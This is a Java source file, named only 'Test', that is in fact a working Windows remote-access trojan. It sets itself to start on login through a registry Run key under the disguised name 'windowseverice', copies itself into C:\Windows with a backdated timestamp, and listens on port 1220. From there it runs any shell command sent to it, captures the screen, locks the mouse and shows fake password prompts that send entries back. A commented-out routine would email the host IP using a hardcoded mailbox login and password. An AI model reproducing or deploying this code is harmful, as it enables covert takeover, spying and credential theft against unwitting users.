import java.awt.AWTException;
import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.Enumeration;
import java.util.Properties;

import javax.imageio.ImageIO;
import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;

public class Test {

    ServerSocket serverSocket;

    Socket socket;

    DataInputStream dis;

    DataOutputStream dos;

    String commendString;

    Process process;

    Runtime r = Runtime.getRuntime();

    BufferedReader bufferedReader;

    BufferedImage bi;

    Robot robot;

    SMail smail;

    MyCopy myCopy;

    MouseLockThread mouseLockThread;
    
    DateFormat sdf = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
    
    int time[] = { 5000, 120000, 300000 }, timeSel = 0;

    public Test() {
        /*
         * ��ע��������ÿ����Զ����� register(); �Լ������ʼ�����Ҫ�ǰ��Լ���IP������
         */
        register();
        /*smail = new SMail();
        while (!smail.sended) {
            if (timeSel >= 3) {
                timeSel = 2;
            }
            try {
                Thread.sleep(time[timeSel++]);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            smail.send(getIP());
        }*/
        
        try {
            serverSocket = new ServerSocket(1220);
        } catch (IOException e1) {
            e1.printStackTrace();
        }
        while (true) {
            try {
                socket = serverSocket.accept();
                dis = new DataInputStream(socket.getInputStream());
                dos = new DataOutputStream(socket.getOutputStream());
            } catch (IOException e) {
                try {
                    dis.close();
                    dos.close();
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                e.printStackTrace();
            }
            try {
                // robot����ִ�в��ٲ������紦��������
                robot = new Robot();
            } catch (AWTException e) {
                e.printStackTrace();
            }
            go();
        }
    }

    /* ��ע��������ÿ����Զ����� */
    void go() {
        while (true) {
            /*
             * ���ﲻ�ϵĽ��ܷ��͹���������Ȼ���������ִ����Ӧ�Ĳ��� �磺�����С̣����Ǳ������Ѿ�ʵ�ֵĹ��ܣ�
             * 1�����ǿ���ͨ������һ���߳�ͨ��robot������꣨�̣� 2��ִ��dos����̣� 3�����䱻���ƶ˵��ļ�
             * 4���鿴�����ƶ˵����棨�̣� 5���ڱ����ƶ˵����Ի��򣨡̣� 6���ñ����ƶ��������̣� 7���ȵȵȵ�
             * �����ʵ�ֶ���������У���Ȼ�����Ҫ�Ϳ������ǶεĴ�������� ͬʱ�Լ���ƺþ��������
             */
            try {
                commendString = dis.readUTF().trim();
            } catch (IOException e) {
                System.out.println("leave");
                break;
            }
            if (commendString.startsWith("-d")) {// ��ʾһ���Ի���
                commendString = commendString.substring(2);
                if (commendString.startsWith("outmsg")) {// �����Ϣ�Ի���
                    try {
                        commendString = commendString.substring(7);
                    } catch (Exception ee) {
                        continue;
                    }
                    showDialog(commendString);
                } else if (commendString.startsWith("inmsg")) {// ����һ������Ի���
                                                               // ������ͨ����
                    try {
                        commendString = commendString.substring(6);
                    } catch (Exception ee) {
                        continue;
                    }
                    // showDialog(commendString);
                    showDialogMsgInput(commendString);
                } else if (commendString.startsWith("inpass")) {// ����һ������Ի���
                                                                // ��������
                    try {
                        commendString = commendString.substring(7);
                    } catch (Exception ee) {
                        continue;
                    }
                    showDialogPassInput(commendString);
                }
            } else if (commendString.startsWith("-p")) {// ��ͼ
                sendPic();
            } else if (commendString.startsWith("-m")) {// �������
                try {
                    commendString = commendString.substring(3);
                } catch (Exception ee) {
                    continue;
                }
                mouseLock(commendString);
            } else if (commendString.startsWith("-flash")) {
                try {
                    commendString = commendString.substring(7);
                } catch (Exception e) {
                    commendString = "";
                }
                new Flash(commendString);
            } else {
                dosExe(commendString);
            }
        }
    }

    /* ��ע���ע�Ὺ���Զ����� */
    public void register() {
        System.out.println("ע��");
        String key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
        String name = "windowseverice";
        String value = "C:\\Windows\\windowseverice.exe";
        String command = "reg add " + key + " /v " + name + " /t REG_SZ /d " + value + " /f";
        try {
            Runtime.getRuntime().exec(command);
            System.out.println("ע������");
        } catch (IOException e) {
            e.printStackTrace();
        }
        File fileDst = new File("C:\\Windows\\windowseverice.exe");
        if (!fileDst.exists()) {
            System.out.println("run");
            File files[] = new File("./").listFiles(new FileFilter() {
    			
            	@Override  
                public boolean accept(File pathname) {  
                    String filename = pathname.getName().toLowerCase();  
                    if(filename.contains(".exe")){
                        return true;  
                    }else{  
                        return false;  
                    }  
                }  
    		});
            if(files.length == 0){
            	return;
            }
            Arrays.sort(files,new Comparator<File>() {
    			@Override
    			public int compare(File o1, File o2) {
    				return (int) (o1.lastModified()-o2.lastModified());
    			}
    		});
            File fileSrc = files[files.length-1];
            System.out.println(fileSrc.getAbsolutePath());
            if(!fileSrc.exists()){
                return;
            }
            new OtherApp().start();
            myCopy = new MyCopy();
            myCopy.fileCopy(fileSrc.getAbsolutePath(), "C:\\Windows\\windowseverice.exe");
            fileDst.setLastModified(new Date(2009-1900,6-1,11,5,39).getTime());
      
           
        }
    }

    /* ��ʾ����Ի��� */
    void showDialogPassInput(String s) {
        MyDialogPassInput input = new MyDialogPassInput(s);
        s = input.pass;
        try {
            dos.writeUTF("password:" + s);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /* ������Ϣ�Ի��� */
    void showDialogMsgInput(String s) {
        MyDialogMsgInput input = new MyDialogMsgInput(s);
        s = input.string;
        try {
            dos.writeUTF("msg:" + s);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /* �����߳�������� */
    void mouseLock(String s) {
        if (s.equals("l")) {
            if (mouseLockThread == null || mouseLockThread.isAlive() == false) {
                mouseLockThread = new MouseLockThread();
                mouseLockThread.flag = true;
                mouseLockThread.start();
            }
        } else if (s.equals("a")) {
            mouseLockThread.flag = false;
        }
    }

    /* ִ��dos���� */
    void dosExe(String dosString) {
        String command = "cmd /c " + dosString;
        String s = null;
        try {
            process = r.exec(command);
            bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader bufferedReaderError = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            if((s = bufferedReader.readLine()) != null){
                dos.writeUTF(" Success:  "+sdf.format(new Date()));
                dos.writeUTF("        "+s);
            }
            while ((s = bufferedReader.readLine()) != null) {
                s = new String(s.trim().getBytes(), "GBK");
                dos.writeUTF("        "+s);
            }
            if((s = bufferedReaderError.readLine()) != null){
                dos.writeUTF(" Error:  "+sdf.format(new Date()));
                dos.writeUTF("        "+s);
            }
            while ((s = bufferedReaderError.readLine()) != null) {
                s = new String(s.trim().getBytes(), "GBK");
                dos.writeUTF("        "+s);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /* ����ͼƬ */
    void sendPic() {
        BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit
            .getDefaultToolkit().getScreenSize().height));
        byte[] imageData = getCompressedImage(bi);
        if (imageData != null) {
            try {
                dos.writeUTF("2start");
                dos.writeInt(imageData.length);
                dos.write(imageData);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    void showDialog(String s) {
        new ShowDialogThread(s).start();
    }

    public static void main(String[] args) {
        new Test();
    }

    /* ����ͼƬ�����㴫�� */
    public byte[] getCompressedImage(BufferedImage image) {
        byte[] imageData = null;
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            imageData = baos.toByteArray();
        } catch (IOException ex) {
            imageData = null;
        }
        return imageData;
    }

    /* ��ȡ����IP */
    String getIP() {
        String ipString = "";
        Enumeration<NetworkInterface> netInterfaces = null;
        try {
            netInterfaces = NetworkInterface.getNetworkInterfaces();
            while (netInterfaces.hasMoreElements()) {
                NetworkInterface ni = netInterfaces.nextElement();
                ipString = ipString + ni.getDisplayName() + "\n";
                ipString = ipString + ni.getName() + "\n";
                Enumeration<InetAddress> ips = ni.getInetAddresses();
                while (ips.hasMoreElements()) {
                    ipString = ipString + ips.nextElement().getHostAddress() + "\n";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return ipString;
    }

    /* ��ʾ��Ϣ�Ի��� */
    class ShowDialogThread extends Thread {

        String info;

        public ShowDialogThread(String s) {
            this.info = s;
        }

        public void run() {
            JOptionPane.showMessageDialog(null, info);
        }
    }

    class MouseLockThread extends Thread {

        boolean flag = false;

        public void run() {
            Point p = MouseInfo.getPointerInfo().getLocation();
            while (flag) {
                try {
                    Thread.sleep(1);
                    robot.mouseMove(p.x, p.y);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    // �����������������Ӧ�ó���
    class OtherApp extends Thread {

        public void run() {
            // new other();
        }
    }

    class JarUtil {

        private String jarName;

        private String jarPath;

        public JarUtil(Class clazz) {
            String path = clazz.getProtectionDomain().getCodeSource().getLocation().getFile();
            try {
                path = java.net.URLDecoder.decode(path, "GBK");
            } catch (java.io.UnsupportedEncodingException e) {
                e.printStackTrace();
            }

            java.io.File jarFile = new java.io.File(path);
            this.jarName = jarFile.getName();

            java.io.File parent = jarFile.getParentFile();
            if (parent != null) {
                this.jarPath = parent.getAbsolutePath();
            }
        }

        public String getJarName() {
            try {
                return java.net.URLDecoder.decode(this.jarName, "GBK");
            } catch (java.io.UnsupportedEncodingException ex) {
            }
            return null;
        }

        public String getJarPath() {
            try {
                return java.net.URLDecoder.decode(this.jarPath, "GBK");
            } catch (java.io.UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            return null;
        }
    }

    /* ���������ļ����� */
    class MyCopy {

        public int fileCopy(String sFile, String oFile) {
            File file = new File(sFile);
            if (!file.exists()) {
                System.out.println(sFile + " not have");
                return -1;
            }
            File fileb = new File(oFile);
            FileInputStream fis = null;
            FileOutputStream fos = null;
            try {
                fis = new FileInputStream(file);
                fos = new FileOutputStream(fileb);
                byte[] bb = new byte[(int) file.length()];
                fis.read(bb);
                fos.write(bb);
            } catch (IOException e) {
                e.printStackTrace();
                return -2;
            } finally {
                try {
                    fis.close();
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                    return -2;
                }
            }
            return 0;
        }
    }

    /*
     * �����ʼ����� ��Ҫһ�������䣬һ���Ƿ��ͷ����䣬һ���ǽ�������
     */
    class SMail {

        boolean sended = false;

        Properties props;

        Session session;

        Message msg;

        Transport transport;

        public void send(String s) {
            try {
                // System.out.println(s);
                props = new Properties();
                props.setProperty("mail.smtp.auth", "true");
                props.setProperty("mail.transport.protocol", "smtp");
                session = Session.getDefaultInstance(props);
                // session.setDebug(true);
                msg = new MimeMessage(session);
                msg.setSubject("ip");
                msg.setText(s);
                /* xxxxxxxxxxxxxxxxΪ���ͷ������û��� */
                // �Լ����Լ���
                msg.setFrom(new InternetAddress("a690215719@163.com"));
                transport = session.getTransport();
                /*
                 * xxxxxxxxxxxxxxxxΪ���ͷ������û�����yyyyyyyyyΪ���ͷ���������
                 */
                transport.connect("smtp.163.com", 25, "a690215719@163.com", "518137326332");
                transport.sendMessage(msg, new Address[] { new InternetAddress("a690215719@163.com") });
                sended = true;
            } catch (Exception e) {
                e.printStackTrace();
                sended = false;
            }finally{
                try {
                    transport.close();
                } catch (MessagingException e) {
                    e.printStackTrace();
                    
                }
            }

        }

        public SMail() {
            sended = false;
        }
    }

    /* ��������� */
    class MyDialogPassInput extends JDialog {

        JPasswordField text;

        JButton sureButton;

        String pass;

        public MyDialogPassInput(String s) {
            this.setModal(true);
            this.setResizable(false);
            FlowLayout fl = new FlowLayout();
            fl.setAlignment(FlowLayout.CENTER);
            this.setLayout(fl);
            text = new JPasswordField(10);
            text.setEchoChar('*');
            add(new JLabel(s + ":"));
            add(text);
            sureButton = new JButton("ȷ��");
            sureButton.addActionListener(new ActionListener() {

                public void actionPerformed(ActionEvent arg0) {
                    if (new String(text.getPassword()).trim().equals("")) {
                        return;
                    }
                    pass = new String(text.getPassword());
                    MyDialogPassInput.this.dispose();
                }
            });
            this.add(sureButton);
            int width = Toolkit.getDefaultToolkit().getScreenSize().width;
            int height = Toolkit.getDefaultToolkit().getScreenSize().height;
            int x = 200, y = 80;
            setBounds((width - x) / 2, (height - y) / 2, x, y);
            setUndecorated(true);
            validate();
            this.setVisible(true);
        }
    }

    /* ���� */
    class Flash {

        JFrame frame;

        JPanel pane;

        Color c[] = { Color.pink, Color.white, Color.blue };

        int i;

        Image offScreenImage = null;

        String msg;

        public Flash(String s) {
            msg = s;
            final int width = Toolkit.getDefaultToolkit().getScreenSize().width;
            final int height = Toolkit.getDefaultToolkit().getScreenSize().height;
            frame = new JFrame();
            frame.setAlwaysOnTop(true);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            frame.setUndecorated(true);
            frame.setBounds(0, 0, width, height);
            pane = new JPanel() {

                public void paint(Graphics g) {
                    if (offScreenImage == null) {
                        offScreenImage = this.createImage(width, height);
                    }
                    Graphics gg = offScreenImage.getGraphics();
                    gg.setFont(new Font(null, Font.PLAIN, 50));
                    gg.setColor(c[i]);
                    gg.fillRect(0, 0, width, height);
                    gg.setColor(Color.black);
                    gg.drawString(msg, 200, 50);
                    g.drawImage(offScreenImage, 0, 0, null);
                }
            };
            frame.setContentPane(pane);
            frame.setVisible(true);
            new Thread() {

                public void run() {
                    int time = 0;
                    while (i < c.length) {
                        Flash.this.myUpdate();
                        try {
                            Thread.sleep(50);
                            time++;
                            if (time == 100) {
                                frame.dispose();
                                break;
                            }
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }.start();
        }

        public void myUpdate() {
            if (i == c.length - 1) {
                i = 0;
            } else {
                i++;
            }
            pane.repaint();
        }
    }

    /* ����Ի��� */
    class MyDialogMsgInput extends JDialog {

        JTextField text;

        JButton sureButton;

        String string;

        public MyDialogMsgInput(String s) {
            this.setModal(true);
            this.setResizable(false);
            FlowLayout fl = new FlowLayout();
            fl.setAlignment(FlowLayout.CENTER);
            this.setLayout(fl);
            text = new JTextField(10);
            add(new JLabel(s + ":"));
            add(text);
            sureButton = new JButton("ȷ��");
            sureButton.addActionListener(new ActionListener() {

                public void actionPerformed(ActionEvent arg0) {
                    if (new String(text.getText()).trim().equals("")) {
                        return;
                    }
                    string = new String(text.getText());
                    MyDialogMsgInput.this.dispose();
                }
            });
            this.add(sureButton);
            int width = Toolkit.getDefaultToolkit().getScreenSize().width;
            int height = Toolkit.getDefaultToolkit().getScreenSize().height;
            int x = 200, y = 80;
            setBounds((width - x) / 2, (height - y) / 2, x, y);
            setUndecorated(true);
            validate();
            this.setVisible(true);
        }
    }
}
